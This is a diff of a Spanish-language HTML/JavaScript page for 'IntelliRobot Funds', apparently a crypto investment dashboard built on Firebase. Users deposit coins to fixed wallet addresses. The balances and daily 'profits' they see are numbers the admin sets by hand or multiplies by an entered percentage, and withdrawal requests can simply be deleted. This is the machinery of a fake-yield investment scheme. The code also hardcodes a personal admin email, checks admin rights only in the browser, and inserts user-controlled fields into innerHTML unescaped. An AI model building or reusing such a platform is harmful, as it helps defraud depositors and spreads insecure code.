@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>IntelliRobot Funds - Gestión Dinámica</title>
+  <title>IntelliRobot Funds - Sistema Integral</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
@@ -11,8 +11,8 @@
   <style>
     body { font-family: system-ui, sans-serif; background: #000; color: white; margin: 0; }
     .modal-bg { background: rgba(0,0,0,0.9); backdrop-filter: blur(8px); }
-    .coin-card { background: #121212; border: 1px solid #27272a; transition: transform 0.2s; }
-    .coin-card:hover { transform: translateY(-5px); border-color: #10b981; }
+    .coin-card { background: #121212; border: 1px solid #27272a; }
+    input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
   </style>
 </head>
 <body>
@@ -27,39 +27,88 @@
   </div>
 </nav>
 
+<div id="loginModal" class="hidden fixed inset-0 modal-bg flex items-center justify-center z-[60]">
+  <div class="bg-zinc-900 p-8 rounded-2xl w-full max-w-md border border-zinc-700">
+    <h2 class="text-2xl font-bold mb-6 text-center">Entrar</h2>
+    <input id="loginEmail" type="email" placeholder="Email" class="w-full p-3 mb-4 bg-zinc-800 border border-zinc-700 rounded-lg text-white outline-none">
+    <input id="loginPass" type="password" placeholder="Contraseña" class="w-full p-3 mb-6 bg-zinc-800 border border-zinc-700 rounded-lg text-white outline-none">
+    <button onclick="doLogin()" class="w-full bg-emerald-600 py-3 rounded-lg font-bold">Entrar</button>
+    <button onclick="hideLoginModal()" class="mt-4 text-zinc-400 w-full text-center text-sm">Cerrar</button>
+  </div>
+</div>
+
+<div id="step1Modal" class="hidden fixed inset-0 modal-bg flex items-center justify-center z-[70]">
+  <div class="bg-zinc-900 p-8 rounded-2xl w-full max-w-lg border border-emerald-500/50 text-center">
+    <h3 class="text-xl font-bold mb-4">Información de Depósito</h3>
+    <p class="text-zinc-300 mb-8">Envía fondos a las direcciones oficiales. El administrador actualizará tu balance tras confirmar la red.</p>
+    <button onclick="showStep2()" class="w-full bg-emerald-600 py-4 rounded-xl font-bold">Aceptar</button>
+  </div>
+</div>
+
+<div id="step2Modal" class="hidden fixed inset-0 modal-bg flex items-center justify-center z-[70]">
+  <div class="bg-zinc-900 p-8 rounded-2xl w-full max-w-lg border border-zinc-700">
+    <h3 class="text-xl font-bold mb-6 text-center text-emerald-400">Datos del Depósito</h3>
+    <select id="coinSelect" onchange="updateAddressDisplay()" class="w-full p-4 mb-6 bg-zinc-800 border border-zinc-700 rounded-xl text-white outline-none">
+      <option value="btc">Bitcoin (BTC)</option>
+      <option value="eth">Ethereum (ETH)</option>
+      <option value="usdt">USDT (Tether)</option>
+    </select>
+    <input id="depositAmount" type="number" step="any" placeholder="Monto enviado" class="w-full p-4 mb-4 bg-zinc-800 border border-zinc-700 rounded-xl text-white outline-none">
+    <div class="bg-black p-4 rounded-xl mb-4 border border-zinc-800">
+      <p id="addressDisplay" class="font-mono text-xs break-all text-emerald-300 text-center uppercase"></p>
+    </div>
+    <button onclick="confirmDeposit()" class="w-full bg-emerald-600 py-4 rounded-xl font-bold">Notificar Pago</button>
+    <button onclick="closeInvestmentFlow()" class="w-full mt-4 text-zinc-500 text-sm">Cancelar</button>
+  </div>
+</div>
+
+<div id="withdrawalModal" class="hidden fixed inset-0 modal-bg flex items-center justify-center z-[70]">
+  <div class="bg-zinc-900 p-8 rounded-2xl w-full max-w-md border border-red-500/30">
+    <h3 class="text-xl font-bold mb-4 text-center text-red-400">Solicitar Retiro</h3>
+    <select id="withdrawCoinSelect" class="w-full p-4 mb-4 bg-zinc-800 border border-zinc-700 rounded-xl text-white">
+        <option value="BTC">Bitcoin (BTC)</option>
+        <option value="ETH">Ethereum (ETH)</option>
+        <option value="USDT">USDT (Tether)</option>
+    </select>
+    <input id="withdrawAmount" type="number" step="any" placeholder="Monto" class="w-full p-4 bg-zinc-800 border border-zinc-700 rounded-xl text-white outline-none">
+    <button onclick="confirmWithdrawal()" class="w-full bg-red-600 py-4 rounded-xl font-bold mt-4">Confirmar</button>
+    <button onclick="hideWithdrawalModal()" class="w-full mt-4 text-zinc-500 text-sm text-center">Cancelar</button>
+  </div>
+</div>
+
 <div id="dashboard" class="hidden max-w-7xl mx-auto px-6 py-24">
   <div class="flex justify-between items-center mb-12 bg-zinc-900/50 p-6 rounded-2xl border border-zinc-800">
     <div>
-      <p class="text-zinc-400 text-sm uppercase tracking-widest">Inversor</p>
       <p id="userEmailDisplay" class="text-xl font-bold text-emerald-400"></p>
+      <p id="userRole" class="text-xs text-zinc-500 uppercase tracking-widest"></p>
     </div>
-    <button onclick="logout()" class="text-red-500 hover:text-white transition">Cerrar Sesión</button>
+    <button onclick="logout()" class="text-red-500 text-sm font-bold">Cerrar Sesión</button>
   </div>
 
   <div id="userStats" class="hidden">
     <div class="mb-8 text-center">
         <span class="bg-emerald-500/10 text-emerald-500 px-4 py-1 rounded-full text-xs font-bold border border-emerald-500/20">
-            Tasa de Rendimiento Actual: <span id="currentAPYDisplay">0</span>% APY
+            Rendimiento Actual: <span id="currentAPYDisplay">...</span>% APY
         </span>
     </div>
     <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
       <div class="coin-card p-8 rounded-3xl text-center">
-        <p class="text-orange-500 font-bold mb-2">BITCOIN</p>
+        <p class="text-orange-500 font-bold mb-2">BTC</p>
         <div id="capBTC" class="text-4xl font-mono font-bold">0.000000</div>
-        <p class="text-[10px] text-zinc-500 mt-4">EST. GANANCIA 24H</p>
-        <p id="profitBTC" class="text-emerald-400 font-bold text-xl">+0.000000</p>
+        <p class="text-[10px] text-zinc-500 mt-4">GANANCIA EST. 24H</p>
+        <p id="profitBTC" class="text-emerald-400 font-bold">+0.000000</p>
       </div>
       <div class="coin-card p-8 rounded-3xl text-center">
-        <p class="text-blue-400 font-bold mb-2">ETHEREUM</p>
+        <p class="text-blue-400 font-bold mb-2">ETH</p>
         <div id="capETH" class="text-4xl font-mono font-bold">0.000000</div>
-        <p class="text-[10px] text-zinc-500 mt-4">EST. GANANCIA 24H</p>
-        <p id="profitETH" class="text-emerald-400 font-bold text-xl">+0.000000</p>
+        <p class="text-[10px] text-zinc-500 mt-4">GANANCIA EST. 24H</p>
+        <p id="profitETH" class="text-emerald-400 font-bold">+0.000000</p>
       </div>
       <div class="coin-card p-8 rounded-3xl text-center">
         <p class="text-emerald-500 font-bold mb-2">USDT</p>
         <div id="capUSDT" class="text-4xl font-mono font-bold">0.00</div>
-        <p class="text-[10px] text-zinc-500 mt-4">EST. GANANCIA 24H</p>
-        <p id="profitUSDT" class="text-emerald-400 font-bold text-xl">+0.00</p>
+        <p class="text-[10px] text-zinc-500 mt-4">GANANCIA EST. 24H</p>
+        <p id="profitUSDT" class="text-emerald-400 font-bold">+0.00</p>
       </div>
     </div>
     <div class="flex gap-4">
@@ -69,29 +118,27 @@
   </div>
 
   <div id="adminPanel" class="hidden space-y-8">
-    <div class="bg-zinc-900 p-8 rounded-3xl border border-emerald-500/30">
-        <h3 class="text-emerald-400 font-bold mb-4 uppercase text-xs tracking-widest">Configuración de Rendimiento</h3>
-        <div class="flex items-center gap-4">
-            <div class="flex-1">
-                <p class="text-zinc-500 text-xs mb-2">Tasa APY Global (%)</p>
-                <input id="apyInput" type="number" step="0.1" class="w-full bg-black border border-zinc-700 p-3 rounded-lg text-white font-bold">
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+        <div class="bg-zinc-900 p-8 rounded-3xl border border-emerald-500/30">
+            <h3 class="text-emerald-400 font-bold mb-4 uppercase text-xs tracking-widest">Tasa APY Global</h3>
+            <div class="flex gap-4">
+                <input id="apyInput" type="number" step="0.1" class="flex-1 bg-black border border-zinc-700 p-3 rounded-lg text-white font-bold">
+                <button onclick="updateGlobalAPY()" class="bg-emerald-600 px-6 py-3 rounded-lg font-bold">Guardar</button>
             </div>
-            <button onclick="updateGlobalAPY()" class="bg-emerald-600 px-8 py-3 rounded-lg font-bold self-end hover:bg-emerald-500 transition">Actualizar Tasa</button>
         </div>
-    </div>
-
-    <div class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800">
-        <h3 class="text-white font-bold mb-4 uppercase text-xs tracking-widest">Cierre de Mercado Diario</h3>
-        <div class="flex gap-4">
-            <input id="dailyPercent" type="number" step="0.01" placeholder="% Ganancia hoy" class="flex-1 bg-black border border-zinc-700 p-3 rounded-lg text-white">
-            <button onclick="processDailyClosure()" class="bg-white text-black px-8 py-3 rounded-lg font-black uppercase text-xs">Ejecutar Cierre</button>
+        <div class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800">
+            <h3 class="text-white font-bold mb-4 uppercase text-xs tracking-widest">Cierre Diario (%)</h3>
+            <div class="flex gap-4">
+                <input id="dailyPercent" type="number" step="0.01" placeholder="Ej: 0.5" class="flex-1 bg-black border border-zinc-700 p-3 rounded-lg text-white">
+                <button onclick="processDailyClosure()" class="bg-white text-black px-6 py-3 rounded-lg font-black uppercase text-xs">Ejecutar</button>
+            </div>
         </div>
     </div>
 
     <div class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 overflow-x-auto">
         <table class="w-full text-left">
             <thead>
-                <tr class="text-zinc-500 text-[10px] uppercase border-b border-zinc-800"><th class="pb-4">Usuario</th><th class="pb-4">Saldos</th><th class="pb-4 text-right">Acción</th></tr>
+                <tr class="text-zinc-500 text-[10px] uppercase border-b border-zinc-800"><th class="pb-4">Usuario / Avisos</th><th class="pb-4">Saldos (BTC/ETH/USDT)</th><th class="pb-4 text-right">Acción</th></tr>
             </thead>
             <tbody id="usersBody"></tbody>
         </table>
@@ -100,7 +147,6 @@
 </div>
 
 <script>
-// --- Configuración e Iniciación ---
 const firebaseConfig = {
   apiKey: "AIzaSyDYQUengy7vyNWX_JgaE-wibB5mBnboXxc",
   authDomain: "intellirobotfunds.firebaseapp.com",
@@ -113,104 +159,160 @@ firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.firestore();
 const ADMIN_EMAIL = "mora87466@gmail.com";
+const wallets = { btc: "bc1qxy2kgdlgjrsqtzq2n0yrf2493p83kkfjhx0wlh", eth: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e", usdt: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" };
+let globalAPY = 18.5;
 
-let globalAPY = 18.5; // Valor por defecto
+// --- MODALES ---
+function showLoginModal() { document.getElementById('loginModal').classList.remove('hidden'); }
+function hideLoginModal() { document.getElementById('loginModal').classList.add('hidden'); }
+function startInvestment() { document.getElementById('step1Modal').classList.remove('hidden'); }
+function showStep2() { document.getElementById('step1Modal').classList.add('hidden'); document.getElementById('step2Modal').classList.remove('hidden'); updateAddressDisplay(); }
+function closeInvestmentFlow() { document.getElementById('step1Modal').classList.add('hidden'); document.getElementById('step2Modal').classList.add('hidden'); }
+function showWithdrawalModal() { document.getElementById('withdrawalModal').classList.remove('hidden'); }
+function hideWithdrawalModal() { document.getElementById('withdrawalModal').classList.add('hidden'); }
 
-// --- Lógica de Negocio Rendimiento ---
-function listenToSettings() {
-    db.collection('settings').doc('yield').onSnapshot(doc => {
-        if(doc.exists) {
-            globalAPY = doc.data().apy || 18.5;
-            const display = document.getElementById('currentAPYDisplay');
-            if(display) display.textContent = globalAPY;
-            const input = document.getElementById('apyInput');
-            if(input) input.value = globalAPY;
-        }
-    });
+function updateAddressDisplay() {
+  const coin = document.getElementById('coinSelect').value;
+  document.getElementById('addressDisplay').textContent = wallets[coin];
 }
 
-async function updateGlobalAPY() {
-    const newVal = parseFloat(document.getElementById('apyInput').value);
-    if(isNaN(newVal)) return alert("Ingresa un número válido");
-    await db.collection('settings').doc('yield').set({ apy: newVal });
-    alert("Tasa de rendimiento actualizada para todos los usuarios.");
+// --- AUTH ---
+function doLogin() {
+  const e = document.getElementById('loginEmail').value;
+  const p = document.getElementById('loginPass').value;
+  auth.signInWithEmailAndPassword(e, p).then(c => {
+    if(!c.user.emailVerified) return alert("Verifica tu email");
+    hideLoginModal();
+  }).catch(err => alert(err.message));
 }
-
-// --- Dashboard de Usuario ---
-function updateProfitUI(data) {
-    const dailyFactor = (globalAPY / 100) / 365;
-    
-    document.getElementById('capBTC').textContent = (data.capBTC || 0).toFixed(6);
-    document.getElementById('profitBTC').textContent = "+" + ((data.capBTC || 0) * dailyFactor).toFixed(6);
-    
-    document.getElementById('capETH').textContent = (data.capETH || 0).toFixed(6);
-    document.getElementById('profitETH').textContent = "+" + ((data.capETH || 0) * dailyFactor).toFixed(6);
-    
-    document.getElementById('capUSDT').textContent = (data.capUSDT || 0).toFixed(2);
-    document.getElementById('profitUSDT').textContent = "+" + ((data.capUSDT || 0) * dailyFactor).toFixed(2);
-}
-
-// --- Admin Panel (Carga de Usuarios) ---
-function loadUsers() {
-    const tbody = document.getElementById('usersBody');
-    db.collection('users').onSnapshot(snap => {
-        tbody.innerHTML = '';
-        snap.forEach(doc => {
-            const data = doc.data();
-            if(data.email === ADMIN_EMAIL) return;
-            
-            const tr = document.createElement('tr');
-            tr.className = "border-b border-zinc-800/50 hover:bg-white/[0.02]";
-            tr.innerHTML = `
-                <td class="py-4 font-bold text-sm">${data.email}</td>
-                <td class="py-4">
-                    <div class="grid grid-cols-3 gap-2">
-                        <input id="b-${doc.id}" type="number" step="any" value="${data.capBTC||0}" class="bg-black border border-zinc-800 p-1 text-[10px] w-20 text-orange-500">
-                        <input id="e-${doc.id}" type="number" step="any" value="${data.capETH||0}" class="bg-black border border-zinc-800 p-1 text-[10px] w-20 text-blue-400">
-                        <input id="u-${doc.id}" type="number" step="any" value="${data.capUSDT||0}" class="bg-black border border-zinc-800 p-1 text-[10px] w-20 text-emerald-500">
-                    </div>
-                </td>
-                <td class="py-4 text-right">
-                    <button onclick="saveCaps('${doc.id}')" class="text-emerald-500 text-xs font-bold">GUARDAR</button>
-                </td>
-            `;
-            tbody.appendChild(tr);
-        });
-    });
-}
-
-async function saveCaps(uid) {
-    const b = parseFloat(document.getElementById(`b-${uid}`).value) || 0;
-    const e = parseFloat(document.getElementById(`e-${uid}`).value) || 0;
-    const u = parseFloat(document.getElementById(`u-${uid}`).value) || 0;
-    await db.collection('users').doc(uid).update({ capBTC: b, capETH: e, capUSDT: u });
-    alert("Saldos guardados.");
-}
-
-// --- Estado de Autenticación ---
-auth.onAuthStateChanged(user => {
-    if(user && user.emailVerified) {
-        document.getElementById('dashboard').classList.remove('hidden');
-        document.getElementById('userEmailDisplay').textContent = user.email;
-        listenToSettings();
-
-        if(user.email === ADMIN_EMAIL) {
-            document.getElementById('adminPanel').classList.remove('hidden');
-            loadUsers();
-        } else {
-            document.getElementById('userStats').classList.remove('hidden');
-            db.collection('users').doc(user.uid).onSnapshot(doc => {
-                if(doc.exists) updateProfitUI(doc.data());
-            });
-        }
-    } else {
-        // Redirigir o mostrar login (aquí simplificado)
-        document.getElementById('authButtons').classList.remove('hidden');
-    }
-});
-
 function logout() { auth.signOut().then(() => location.reload()); }
-// (Incluir aquí funciones de modales y procesos de cierre diario del código anterior)
+
+// --- LOGICA DE FONDOS (USUARIO) ---
+async function confirmDeposit() {
+  const coin = document.getElementById('coinSelect').value.toUpperCase();
+  const amt = parseFloat(document.getElementById('depositAmount').value);
+  if(!amt || amt <= 0) return alert("Ingresa un monto");
+  try {
+    const newReq = { id: "REQ-"+Date.now(), type: 'DEPÓSITO', amount: amt, currency: coin, date: new Date().toLocaleString() };
+    await db.collection('users').doc(auth.currentUser.uid).update({ pendingRequests: firebase.firestore.FieldValue.arrayUnion(newReq) });
+    alert("Notificación enviada");
+    closeInvestmentFlow();
+  } catch(err) { alert(err.message); }
+}
+
+async function confirmWithdrawal() {
+  const coin = document.getElementById('withdrawCoinSelect').value;
+  const amt = parseFloat(document.getElementById('withdrawAmount').value);
+  const field = "cap" + coin;
+  try {
+    const doc = await db.collection('users').doc(auth.currentUser.uid).get();
+    if(amt > (doc.data()[field] || 0)) return alert("Saldo insuficiente");
+    const newReq = { id: "REQ-"+Date.now(), type: 'RETIRO', amount: amt, currency: coin, date: new Date().toLocaleString() };
+    await db.collection('users').doc(auth.currentUser.uid).update({ pendingRequests: firebase.firestore.FieldValue.arrayUnion(newReq) });
+    alert("Solicitud enviada");
+    hideWithdrawalModal();
+  } catch(err) { alert(err.message); }
+}
+
+// --- ADMIN ---
+async function updateGlobalAPY() {
+  const val = parseFloat(document.getElementById('apyInput').value);
+  try {
+    await db.collection('settings').doc('yield').set({ apy: val });
+    alert("APY Actualizado");
+  } catch(e) { alert("Error de permisos"); }
+}
+
+async function processDailyClosure() {
+  const p = parseFloat(document.getElementById('dailyPercent').value);
+  if(!p) return alert("Ingresa %");
+  try {
+    const snap = await db.collection('users').get();
+    const batch = db.batch();
+    const f = 1 + (p/100);
+    snap.forEach(doc => {
+      if(doc.data().email !== ADMIN_EMAIL) {
+        batch.update(doc.ref, { capBTC: (doc.data().capBTC||0)*f, capETH: (doc.data().capETH||0)*f, capUSDT: (doc.data().capUSDT||0)*f });
+      }
+    });
+    await batch.commit();
+    alert("Cierre ejecutado");
+  } catch(e) { alert(e.message); }
+}
+
+function loadUsers() {
+  db.collection('users').onSnapshot(snap => {
+    const tbody = document.getElementById('usersBody');
+    tbody.innerHTML = '';
+    snap.forEach(doc => {
+      const d = doc.data(); if(d.email === ADMIN_EMAIL) return;
+      let reqs = ''; (d.pendingRequests||[]).forEach(r => {
+        reqs += `<div class="text-[9px] bg-zinc-800 p-1 mb-1 rounded flex justify-between">
+          <span>${r.type}: ${r.amount} ${r.currency}</span>
+          <button onclick="delReq('${doc.id}','${r.id}')">✕</button>
+        </div>`;
+      });
+      const tr = document.createElement('tr');
+      tr.className = "border-b border-zinc-800";
+      tr.innerHTML = `
+        <td class="py-4 text-xs font-bold">${d.email}<div class="mt-2">${reqs}</div></td>
+        <td class="py-4">
+          <div class="flex gap-1">
+            <input id="b-${doc.id}" type="number" step="any" value="${d.capBTC||0}" class="bg-black border border-zinc-800 text-[10px] w-16 p-1">
+            <input id="e-${doc.id}" type="number" step="any" value="${d.capETH||0}" class="bg-black border border-zinc-800 text-[10px] w-16 p-1">
+            <input id="u-${doc.id}" type="number" step="any" value="${d.capUSDT||0}" class="bg-black border border-zinc-800 text-[10px] w-16 p-1">
+          </div>
+        </td>
+        <td class="text-right"><button onclick="save('${doc.id}')" class="text-emerald-500 font-bold text-xs">OK</button></td>`;
+      tbody.appendChild(tr);
+    });
+  });
+}
+
+async function save(uid) {
+  const b = parseFloat(document.getElementById(`b-${uid}`).value);
+  const e = parseFloat(document.getElementById(`e-${uid}`).value);
+  const u = parseFloat(document.getElementById(`u-${uid}`).value);
+  await db.collection('users').doc(uid).update({ capBTC:b, capETH:e, capUSDT:u });
+  alert("Guardado");
+}
+
+async function delReq(uid, rid) {
+  const doc = await db.collection('users').doc(uid).get();
+  const fil = doc.data().pendingRequests.filter(r => r.id !== rid);
+  await db.collection('users').doc(uid).update({ pendingRequests: fil });
+}
+
+// --- OBSERVER ---
+auth.onAuthStateChanged(user => {
+  if(user && user.emailVerified) {
+    document.getElementById('dashboard').classList.remove('hidden');
+    document.getElementById('userEmailDisplay').textContent = user.email;
+    db.collection('settings').doc('yield').onSnapshot(s => {
+      globalAPY = s.data()?.apy || 18.5;
+      document.getElementById('currentAPYDisplay').textContent = globalAPY;
+    });
+
+    if(user.email === ADMIN_EMAIL) {
+      document.getElementById('adminPanel').classList.remove('hidden');
+      document.getElementById('userRole').textContent = "ADMIN";
+      loadUsers();
+    } else {
+      document.getElementById('userStats').classList.remove('hidden');
+      document.getElementById('userRole').textContent = "INVERSOR";
+      db.collection('users').doc(user.uid).onSnapshot(doc => {
+        const d = doc.data();
+        const factor = (globalAPY / 100) / 365;
+        document.getElementById('capBTC').textContent = (d.capBTC||0).toFixed(6);
+        document.getElementById('profitBTC').textContent = "+" + ((d.capBTC||0)*factor).toFixed(6);
+        document.getElementById('capETH').textContent = (d.capETH||0).toFixed(6);
+        document.getElementById('profitETH').textContent = "+" + ((d.capETH||0)*factor).toFixed(6);
+        document.getElementById('capUSDT').textContent = (d.capUSDT||0).toFixed(2);
+        document.getElementById('profitUSDT').textContent = "+" + ((d.capUSDT||0)*factor).toFixed(2);
+      });
+    }
+  } else { document.getElementById('authButtons').classList.remove('hidden'); }
+});
 </script>
 </body>
 </html>
